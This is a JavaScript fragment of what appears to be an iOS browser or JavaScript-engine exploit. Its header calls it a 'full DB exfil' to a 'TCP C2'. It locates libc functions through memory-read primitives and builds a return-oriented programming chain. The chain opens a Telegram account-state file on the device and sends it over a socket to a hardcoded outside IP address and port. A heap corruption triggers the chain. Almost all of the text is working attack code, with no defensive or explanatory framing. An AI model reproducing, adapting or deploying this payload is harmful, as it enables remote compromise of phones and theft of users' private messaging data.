/* ===== iOS full DB exfil via mmap fixed 0x120000000 -> TCP C2 ===== */
  function u64(x) { return BigInt.asUintN(64, x); }
  function rd32_(A) {
    var a = A & ~7n;
    var q = u64(RD(a));
    var sh = Number(A & 7n) * 8;
    return Number((q >> BigInt(sh)) & 0xffffffffn);
  }
  function put64_(arr, off, val) {
    var v = u64(val);
    for (var i = 0; i < 8; i++) arr[off + i] = Number((v >> BigInt(i * 8)) & 0xffn);
  }
  var base = 0n;
  if (CFG.JS_DEF_FREE) {
    base = u64(js_free - BigInt(CFG.JS_DEF_FREE));
    if ((rd32_(base) >>> 0) !== 0xfeedfacf) base = 0n;
  }
  if (base === 0n) { setres('M_NO_BASE'); return; }
  var libcFree = 0n;
  if (rd32_(js_free) === 0xaa0103e0) {
    var br = rd32_(js_free + 4n);
    if (((br & 0xfc000000) >>> 0) === 0x14000000) {
      var im = br & 0x03ffffff;
      if (im & 0x02000000) im -= 0x04000000;
      var plt = js_free + 4n + BigInt(im) * 4n;
      var ad = rd32_(plt);
      if (((ad & 0x9f000000) >>> 0) === 0x90000000) {
        var ml = (ad >>> 29) & 3, mh = (ad >>> 5) & 0x7ffff;
        var ai = (mh << 2) | ml;
        if (ai & 0x100000) ai -= 0x200000;
        var pg = (plt & ~0xfffn) + BigInt(ai) * 4096n;
        var ld = rd32_(plt + 4n);
        if (((ld & 0xffc00000) >>> 0) === 0xf9400000) {
          var g2 = RD(pg + BigInt((ld >>> 10) & 0xfff) * 8n);
          if (codeok(g2)) libcFree = g2;
        }
      }
    }
  }
  if (libcFree === 0n) { setres('M_NO_FREE'); return; }
  var MMAP = u64(libcFree + 0xb79b58f0n);
  var OPEN = u64(libcFree + 0xb79b52bcn);
  var READ = u64(libcFree + 0xb79b4a44n);
  var SOCKET = u64(libcFree + 0xb79b3fb4n);
  var CONNECT = u64(libcFree + 0xb79b9998n);
  var DUP2 = u64(libcFree + 0xb79c3138n);
  var SEND = u64(libcFree + 0x79ccf78n);
  var SENDFILE = u64(libcFree + 0xb79c3f24n);
  var PEXIT = u64(libcFree - 0x88acn);
  var MKDIR = u64(libcFree + 0xb79b4f9cn);
  var GETPID = u64(libcFree + 0xb79b4cc0n);
  var G_CALL = base + 0x3292cn;
  var G_LOAD = base + 0x172d96cn;
  var G_X0 = base + 0x628a2cn;
  var PIVOT2 = u64(libcFree + 0xb6583074n);

  var MAG = (BigInt((Math.random() * 0x100000000) >>> 0) << 32n) |
            BigInt((Math.random() * 0x100000000) >>> 0);
  if (MAG === 0n) MAG = 0x5a5a5a5a5a5a5a5an;
  var UB = new Uint8Array(16384);
  for (var i0 = 0; i0 < 16384; i0++) UB[i0] = 0;
  put64_(UB, 0x800, MAG);
  var U = 0n, lim = 0x10000n, off;
  for (off = D; off < D + lim; off += 8n) {
    var w = RD(off);
    if ((w & 0xffffffffn) === 16384n) {
      var p = RD(off + 16n);
      var pq = p & 0x00ffffffffffffffn;
      if (pq > 0x10000n && pq < 0x0001000000000000n && (p & 7n) === 0n) {
        try { if (RD(p + 0x800n) === MAG) { U = p; break; } } catch (e) {}
      }
    }
  }
  if (U === 0n) {
    for (off = D - 8n; off > D - lim; off -= 8n) {
      var w2 = RD(off);
      if ((w2 & 0xffffffffn) === 16384n) {
        var p2 = RD(off + 16n);
        var pq2 = p2 & 0x00ffffffffffffffn;
        if (pq2 > 0x10000n && pq2 < 0x0001000000000000n && (p2 & 7n) === 0n) {
          try { if (RD(p2 + 0x800n) === MAG) { U = p2; break; } } catch (e) {}
        }
      }
    }
  }
  if (U === 0n) { setres('M_NF D=' + hex(D)); return; }

  var DB = '/var/mobile/Containers/Shared/AppGroup/00000000-0000-0000-0000-000000000000/telegram-data/accounts-metadata/atomic-state';
  var DBSIZE = 3039n;
  var BUF = U + 0x2000n;
  function a8(x) { return (x + 7) & ~7; }
  var oPath = 0;
  var oSock = a8(oPath + DB.length + 1);
  var oAsock = 0x100, oBsock = 0x140, oAdup = 0x180, oAconn = 0x1C0, oBconn = 0x200;
  var oAmmap = 0x240, oBmmap = 0x280, oAopen = 0x2C0, oBopen = 0x300;
  var oAread = 0x340, oAsend = 0x380, oBsend = 0x3C0, oBexit = 0x400;
  for (var z = 0; z < 0x808; z++) UB[z] = 0;
  for (var z2 = 0; z2 < DB.length; z2++) UB[oPath + z2] = DB.charCodeAt(z2) & 0xff;
  var P1 = '/var/mobile/Containers/Data/Application/00000000-0000-0000-0000-000000000000/Documents/ropmark';
  var oMk = 0x900;
  for (var z5 = 0; z5 < P1.length; z5++) UB[oMk + z5] = P1.charCodeAt(z5) & 0xff;
  UB[oSock] = 16; UB[oSock + 1] = 2;
  UB[oSock + 2] = 0xAD; UB[oSock + 3] = 0xD3;
  UB[oSock + 4] = 84; UB[oSock + 5] = 221; UB[oSock + 6] = 240; UB[oSock + 7] = 183;
  put64_(UB, oAsock + 0x10, 1n);
  put64_(UB, oBsock + 0x28, 2n);
  put64_(UB, oAdup + 0x10, 40n);
  put64_(UB, oAconn + 0x10, U + BigInt(oSock));
  put64_(UB, oAconn + 0x18, 16n);
  put64_(UB, oBconn + 0x28, 40n);
  put64_(UB, oAmmap + 0x10, DBSIZE);
  put64_(UB, oAmmap + 0x18, 3n);                   /* PROT_READ|WRITE */
  put64_(UB, oAmmap + 0x20, 0x1002n);              /* MAP_PRIVATE|ANON */
  put64_(UB, oAmmap + 0x28, 0xffffffffffffffffn);   /* fd = -1 */
  put64_(UB, oAmmap + 0x30, 0n);
  put64_(UB, oBmmap + 0x28, U + BigInt(oMk));
  put64_(UB, oBopen + 0x28, U + BigInt(oPath));
  put64_(UB, oAread + 0x10, 41n);
  put64_(UB, oAread + 0x18, 0n);
  put64_(UB, oAsend + 0x10, 41n);
  put64_(UB, oAsend + 0x18, 0n);
  put64_(UB, oAsend + 0x20, U + BigInt(oLen));
  var oLen = 0xA00;
  put64_(UB, oLen, 0x10000000n);
  put64_(UB, oBsend + 0x28, 40n);

  var T = TRIG;
  if (!T || T.length < 0x780) { setres('M_TRIG'); return; }
  for (var i1 = 0; i1 < 0x780; i1++) T[i1] = 0;
  put64_(T, 0x08, U + BigInt(oBsock));
  put64_(T, 0x10, G_LOAD);
  put64_(T, 0x18, U + BigInt(oAsock));
  put64_(T, 0xB8, U + BigInt(oBsock));
  put64_(T, 0xD0, SOCKET);
  put64_(T, 0xE0, G_X0);
  put64_(T, 0xF0, G_LOAD);
  put64_(T, 0xF8, U + BigInt(oAdup));
  put64_(T, 0x110, G_CALL);
  put64_(T, 0x1A0, DUP2);
  put64_(T, 0x1C0, G_CALL);
  put64_(T, 0x250, G_LOAD);
  put64_(T, 0x258, U + BigInt(oAconn));
  put64_(T, 0x270, G_CALL);
  put64_(T, 0x2F8, U + BigInt(oBconn));
  put64_(T, 0x310, CONNECT);
  put64_(T, 0x320, G_X0);
  put64_(T, 0x330, G_LOAD);
  put64_(T, 0x338, U + BigInt(oAmmap));
  put64_(T, 0x350, G_CALL);
  put64_(T, 0x3D8, U + BigInt(oBmmap));
  put64_(T, 0x3F0, MKDIR);
  put64_(T, 0x400, G_X0);
  put64_(T, 0x410, G_LOAD);
  put64_(T, 0x418, U + BigInt(oAopen));
  put64_(T, 0x430, G_CALL);
  put64_(T, 0x4B8, U + BigInt(oBopen));
  put64_(T, 0x4D0, OPEN);
  put64_(T, 0x4E0, G_X0);
  put64_(T, 0x4F0, G_LOAD);
  put64_(T, 0x4F8, U + BigInt(oAread));
  put64_(T, 0x510, G_CALL);
  put64_(T, 0x5A0, DUP2);
  put64_(T, 0x5C0, G_CALL);
  put64_(T, 0x650, G_LOAD);
  put64_(T, 0x658, U + BigInt(oAsend));
  put64_(T, 0x670, G_CALL);
  put64_(T, 0x6F8, U + BigInt(oBsend));
  put64_(T, 0x710, SENDFILE);
  put64_(T, 0x720, G_X0);
  put64_(T, 0x728, U + BigInt(oBexit));
  put64_(T, 0x740, PEXIT);
  put64_(T, 0x750, G_X0);

  var RT_FREE = rt + 16n, RT_USABLE = rt + 32n, RT_SIZE = rt + 48n, RT_OPAQUE = rt + 64n;
  var HUGE = 0xffffffffffffffffn, ZERO = 0n;
  setres('M_RDY ' + hex(U));
  setR(RT_FREE); Rb[0] = G_CALL;
  setR(RT_OPAQUE); Rb[0] = ZERO;
  setR(RT_SIZE); Rb[0] = HUGE;
  setR(RT_USABLE); Rb[0] = PIVOT2;
  T = null;
  try { TRIG = null; } catch (e) { setres('M_EXC'); return; }
  for (var g = 0; g < 96; g++) new Uint8Array(1048576);
  setres('M_AFTER');
